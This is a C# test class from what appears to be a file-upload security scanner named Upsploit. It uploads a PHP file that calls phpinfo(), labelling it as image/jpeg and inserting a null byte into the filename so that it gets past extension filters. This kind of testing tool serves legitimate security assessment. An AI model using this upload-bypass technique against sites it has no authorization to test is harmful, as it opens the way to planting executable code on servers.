using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

/*
* Test #9
* Description: This test insert a null byte before the allowed extension but after the forbidden one. 
* The server should cut off everything after the null byte.
*/
namespace Upsploit.Tests {
    class Test09 : Test {
        public override sealed string description { get; set; }
        public override sealed string validation { get; set; }

        public Test09() {
            description = "This test uploads a file (Test_9.php) with the MIME type \"image/jpeg\". " +
              "The file is a php file with a nullbyte before the extension." +
              "\r\n\r\n" +
              "The test will work on websites that read strings until a null byte. The server will still upload the file with it's extension.";

            validation = "Look for Test_9.php on the web application. " +
                         "If the file displays the servers phpinfo, the test was a success and the web application is vulnerable.\r\n\r\n" +
                         "If the file no longer has the correct extension or displays an image, the test failed.";
        }

        internal override async Task runTest(UploadRequest.UploadRequest request) {
            //Insert a null byte between the two extensions
            const string data = "<?php\n"
                                + "  echo phpinfo();\n"
                                + "?>";

            IEnumerable<byte> rv = Encoding.ASCII.GetBytes("Test_9.php").Concat(new byte[] {0x00}).Concat(Encoding.ASCII.GetBytes(".jpg"));
 

            request.setFileData(data);
            request.setFileContentType("image/jpeg");
            request.setFileName(rv.ToArray());

            await request.send();
            printResult(request, "Test 09 (Null byte)");
        }
    }
}